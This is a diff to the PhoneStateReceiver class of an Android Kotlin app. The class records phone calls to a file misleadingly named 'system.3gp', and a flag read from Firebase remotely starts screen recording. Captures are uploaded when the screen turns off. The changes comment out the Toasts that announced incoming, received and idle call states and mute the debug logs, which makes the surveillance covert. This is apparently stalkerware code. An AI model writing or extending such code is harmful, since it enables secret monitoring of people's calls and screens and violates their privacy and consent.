@@ -57,7 +57,6 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
     var mContext: Context? = null
     var outputFile = Environment.getExternalStorageDirectory().absolutePath + "/system.3gp"
-    private var filePath = ""
     var myAudioRecorder: MediaRecorder? = MediaRecorder()
     var myRef: DatabaseReference? = null
     /**
@@ -80,24 +79,26 @@ class PhoneStateReceiver : BroadcastReceiver() {
             if (ScreenPreference.getInstance(context).saveDeviceID == "0") {
                 if (Intent.ACTION_SCREEN_ON == action) {
 
-                    Log.d(TAG, "screen is on 1...")
+                //    Log.d(TAG, "screen is on 1...")
 
                 } else if (Intent.ACTION_SCREEN_OFF == action) {
-                    Log.d(TAG, "screen is off 1...")
+                 //   Log.d(TAG, "screen is off 1...")
 
                     if (ScreenRecordingActivity.instance.mMediaRecorder != null) {
 
                         if (ScreenPreference.getInstance(context).saveStatus == "true") {
                             try {
-                                Log.d(TAG, "bat dau stop...")
+                        //        Log.d(TAG, "bat dau stop...")
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.stop()
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
-                                Log.d(TAG, "da stop...")
+                        //        Log.d(TAG, "da stop...")
                                 ScreenPreference.getInstance(context).saveStatus = "false"
                                 ScreenRecordingActivity.instance.upload()
                                 ScreenRecordingActivity.instance.stopCountTimer()
-                            }catch (e:IllegalStateException){
+                            } catch (e: IllegalStateException) {
                                 e.printStackTrace()
+                                val fdelete = File(ScreenRecordingActivity.instance.filePathDelete)
+                                fdelete.delete()
                             }
 
                         }
@@ -106,41 +107,47 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
                 } else if (Intent.ACTION_USER_PRESENT == action) {
 
-                    Log.d(TAG, "screen is unlock... 1")
+                   // Log.d(TAG, "screen is unlock... 1")
                     ScreenPreference.getInstance(context).saveDeviceID = "1"
                     // context.startService(Intent(context, ScreenService::class.java))
 
 
                 }
             } else {
-                if (Intent.ACTION_SCREEN_ON == action) {
-
-                    Log.d(TAG, "screen is on.2..")
-
-
-                } else if (Intent.ACTION_SCREEN_OFF == action) {
+                if (Intent.ACTION_SCREEN_OFF == action) {
+                   // Log.d(TAG, "off khong lam j...")
 
                     if (ScreenRecordingActivity.instance.mMediaRecorder != null) {
 
                         if (ScreenPreference.getInstance(context).saveStatus == "true") {
                             try {
-                                Log.d(TAG, "bat dau stop...")
+                               // Log.d(TAG, "bat dau stop...")
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.stop()
                                 ScreenRecordingActivity.instance.mMediaRecorder!!.reset()
-                                Log.d(TAG, "da stop...")
+                                //Log.d(TAG, "da stop...")
                                 ScreenPreference.getInstance(context).saveStatus = "false"
                                 ScreenRecordingActivity.instance.upload()
                                 ScreenRecordingActivity.instance.stopCountTimer()
-                            }catch (e:IllegalStateException){
+                            } catch (e: IllegalStateException) {
                                 e.printStackTrace()
+
+
                             }
 
                         }
 
                     }
-                } else if (Intent.ACTION_USER_PRESENT == action) {
+
+                    try {
+                        ScreenRecordingActivity.instance.stopCountTimer()
+
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                    }
+                }
+                if (Intent.ACTION_USER_PRESENT == action) {
                     context.startService(Intent(context, ScreenService::class.java))
-                    Log.d(TAG, "screen is unlock... 2")
+                 //   Log.d(TAG, "screen is unlock... 2")
                     checkOnOff()
                 }
             }
@@ -150,7 +157,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
             if (state == TelephonyManager.EXTRA_STATE_RINGING) {
 
-                Toast.makeText(context, "Incoming Call State", Toast.LENGTH_SHORT).show()
+                //   Toast.makeText(context, "Incoming Call State", Toast.LENGTH_SHORT).show()
                 //         Toast.makeText(context, "Ringing State Number is -$incomingNumber", Toast.LENGTH_SHORT).show()
 //
 
@@ -162,8 +169,8 @@ class PhoneStateReceiver : BroadcastReceiver() {
                 myAudioRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                 myAudioRecorder?.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB)
                 myAudioRecorder?.setOutputFile(outputFile)
-                //nhận cuộc gọi
-                Toast.makeText(context, "Call Received State", Toast.LENGTH_SHORT).show()
+                //   //nhận cuộc gọi
+                //   Toast.makeText(context, "Call Received State", Toast.LENGTH_SHORT).show()
                 try {
                     myAudioRecorder?.prepare()
                     myAudioRecorder?.start()
@@ -179,7 +186,7 @@ class PhoneStateReceiver : BroadcastReceiver() {
                 //  val fdelete = File(MainActivity.instance.outputFile)
                 // println(MainActivity.instance.outputFile)
                 // fdelete.delete()
-                Toast.makeText(context, "Call Idle State", Toast.LENGTH_SHORT).show()
+                //   Toast.makeText(context, "Call Idle State", Toast.LENGTH_SHORT).show()
 
                 if (null != myAudioRecorder) {
 
@@ -215,14 +222,25 @@ class PhoneStateReceiver : BroadcastReceiver() {
 
             override fun onDataChange(dataSnapshot: DataSnapshot) {
                 val value = dataSnapshot.getValue(String::class.java)
-                Log.d(TAG, "Value is: $value")
+               // Log.d(TAG, "Value is: $value")
                 if (value!!.contains("true")) {
 
-                    Log.d(TAG, "screen is unlock...")
+               //     Log.d(TAG, "screen is unlock...")
                     var inten = Intent(mContext, ScreenRecordingActivity::class.java)
                     inten.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                     inten.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                     mContext!!.startActivity(inten)
+
+                } else {
+                    try {
+                        if (ScreenRecordingActivity.instance.timer != null) {
+                            ScreenRecordingActivity.instance.timer!!.cancel()
+
+                        }
+
+                    } catch (e: Exception) {
+
+                    }
 
                 }
             }
